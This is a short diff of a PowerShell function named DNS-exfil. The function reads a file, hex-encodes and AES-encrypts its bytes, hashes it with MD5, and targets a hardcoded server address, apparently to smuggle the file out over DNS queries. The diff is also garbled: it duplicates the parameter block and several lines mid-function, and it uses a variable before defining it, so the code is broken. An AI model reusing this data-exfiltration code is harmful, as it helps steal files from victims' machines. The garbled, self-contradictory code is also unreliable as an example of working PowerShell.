@@ -3,9 +3,20 @@ function DNS-exfil
     param ([string] $file)
     $server = '192.168.0.17'
     $bytes = [System.IO.File]::ReadAllBytes($file)
+    $hash = [System.BitConverter]::ToString($md5.ComputeHash($bytes))
+    $hash = $hash -replace '-','';
+    $md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
+    $bytes = AES $bytes
     $string = [System.BitConverter]::ToString($bytes);
+    $string = $string -replace '-','';
+    $filename = Split-Path $file -leaf
+    param ([string] $file)
+    $server = '192.168.0.17'
+    $bytes = [System.IO.File]::ReadAllBytes($file)
+    $string = [System.BitConverter]::ToString($bytes);
+    $string = $string -replace '-','';
     $data = [System.IO.File]::ReadAllBytes($file)
-    $string = AES $string
+
     $string = [System.BitConverter]::ToString($data);
     $md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
     $hash = [System.BitConverter]::ToString($md5.ComputeHash($bytes))
